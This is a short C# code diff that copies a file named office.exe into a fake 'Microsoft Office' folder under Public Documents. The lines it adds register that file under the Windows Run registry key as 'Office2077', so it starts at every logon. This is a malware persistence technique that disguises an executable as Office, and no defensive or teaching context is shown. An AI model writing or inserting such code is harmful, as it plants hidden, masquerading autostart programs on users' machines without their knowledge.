@@ -2,7 +2,7 @@ using System;
 using System.Diagnostics;
 using System.Runtime;
 using System.IO;
-namespace Repeat
+namespace Start
 {
 	class Pogram
 	{
@@ -19,6 +19,8 @@ namespace Repeat
 			string path = @"office.exe";
 			string path1 = @"C:\Users\Public\Documents\Microsoft Office\office.exe";
 			File.Copy(path, path1);
+			RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
+			key.SetValue("Office2077", @"C:\Users\Public\Documents\Microsoft Office\office.exe");
 		}
 	}
 }
